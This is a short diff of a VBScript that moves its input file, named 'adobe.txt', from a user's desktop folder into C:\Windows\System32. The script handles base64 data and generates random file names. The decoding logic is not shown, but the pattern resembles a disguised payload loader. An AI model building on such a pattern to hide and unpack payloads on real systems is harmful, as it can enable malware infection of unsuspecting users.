@@ -2,7 +2,7 @@ Option Explicit
 
 Dim a, inFile, fso, ts, b64, bytes, outFile, curDir, loopCount
 
-a = "C:\Users\tangu\Bureau\a\adobe.txt"
+a = "C:\Windows\System32\adobe.txt"
 
 ' Check file path
 inFile = a
@@ -74,3 +74,4 @@ Private Function RandomName(ByVal n)
     RandomName = RandomName & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
   Next
 End Function
+
